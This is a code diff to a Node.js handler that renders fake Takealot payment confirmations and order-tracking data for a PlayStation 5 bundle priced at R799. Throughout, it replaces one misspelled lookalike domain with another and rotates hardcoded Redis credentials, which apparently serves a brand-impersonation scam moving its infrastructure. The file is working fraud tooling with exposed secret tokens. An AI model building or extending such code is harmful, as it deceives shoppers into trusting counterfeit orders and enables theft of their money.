@@ -13,14 +13,15 @@
 
 'use strict';
 
-const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL
+const REDIS_URL   = process.env.UPSTASH_REDIS_REST_KV_REST_API_URL
+  || process.env.UPSTASH_REDIS_REST_URL
   || process.env.KV_REST_API_URL
-  || process.env.REDIS_URL
-  || 'https://magnetic-werewolf-246021.upstash.io';
-const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN
+  || 'https://chief-crab-198297.upstash.io';
+const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_KV_REST_API_TOKEN
+  || process.env.UPSTASH_REDIS_REST_TOKEN
   || process.env.KV_REST_API_TOKEN
   || process.env.REDIS_TOKEN
-  || 'gQAAAAAAA8EFAAIgcDEyZTUyMjZlMTVlN2Y0YWI0YjA3YzVlOThiOWY3YTllMw';
+  || 'gQAAAAAAAwaZAAIgcDI4ZmM0NzUwNzk2ZWQ0N2JiODJmOGY4MGQ3ZDU3YjJiMg';
 
 const fs = require('fs');
 const path = require('path');
@@ -106,7 +107,7 @@ function renderOrderPlainText(order) {
   const deliveryDateLong = order.delivery_date_long || dates.delivery_date_long;
   const customerName = order.customer_name || 'Customer';
   const orderNumber = order.order_id;
-  const trackUrl = `https://takelaotpromo.vercel.app/track.html?order=${encodeURIComponent(orderNumber)}`;
+  const trackUrl = `https://takekalotpromips.vercel.app/track.html?order=${encodeURIComponent(orderNumber)}`;
 
   return [
     `TAKEALOT PAYMENT CONFIRMATION`,
@@ -138,7 +139,7 @@ function renderOrderPlainText(order) {
     `TRACK YOUR ORDER:`,
     `${trackUrl}`,
     ``,
-    `Need help? Find answers at https://takelaotpromo.vercel.app`,
+    `Need help? Find answers at https://takekalotpromips.vercel.app`,
     ``,
     `Regards,`,
     `The Takealot Team`,
@@ -231,14 +232,14 @@ function publicView(order) {
     product_name:            order.product_name || 'PlayStation 5 Digital Edition + Dualsense 5 Controller + PS VR2 + GTA 6 + FC27 + Black Myth: Wukong - PS5',
     product_price:           order.product_price || 799,
     currency:                order.currency || 'ZAR',
-    product_image:           order.product_image || 'https://takelaotpromo.vercel.app/images/ps5-slim-bundle-main.jpg',
+    product_image:           order.product_image || 'https://takekalotpromips.vercel.app/images/ps5-slim-bundle-main.jpg',
     received_date:           dates.received_date,
     delivery_date:           dates.delivery_date,
     order_date_upper:        dates.order_date_upper,
     order_date_formatted:    order.order_date_formatted || dates.order_date_formatted,
     delivery_date_formatted: order.delivery_date_formatted || dates.delivery_date_formatted,
     delivery_date_long:      order.delivery_date_long || dates.delivery_date_long,
-    tracking_url:            order.tracking_url || (`https://takelaotpromo.vercel.app/track.html?order=` + encodeURIComponent(order.order_id)),
+    tracking_url:            order.tracking_url || (`https://takekalotpromips.vercel.app/track.html?order=` + encodeURIComponent(order.order_id)),
     status:                  order.status || 'PROCESSING',
     status_history: (order.status_history || []).map(function(e) {
       return { status: e.status, timestamp: e.timestamp };
@@ -380,14 +381,14 @@ module.exports = async function handler(req, res) {
         product_name: 'PlayStation 5 Digital Edition + Dualsense 5 Controller + PS VR2 + GTA 6 + FC27 + Black Myth: Wukong - PS5',
         product_price: 799,
         currency: 'ZAR',
-        product_image: 'https://takelaotpromo.vercel.app/images/ps5-slim-bundle-main.jpg',
+        product_image: 'https://takekalotpromips.vercel.app/images/ps5-slim-bundle-main.jpg',
         received_date: purchaseIso,
         delivery_date: deliveryIso,
         order_date_formatted: dates.order_date_formatted,
         delivery_date_formatted: dates.delivery_date_formatted,
         delivery_date_long: dates.delivery_date_long,
         delivery_date_iso: dates.delivery_date_iso,
-        tracking_url: 'https://takelaotpromo.vercel.app/track.html?order=' + encodeURIComponent(orderId),
+        tracking_url: 'https://takekalotpromips.vercel.app/track.html?order=' + encodeURIComponent(orderId),
         status: calculatedStatus,
         status_history: [
           { status: 'RECEIVED', timestamp: purchaseIso },
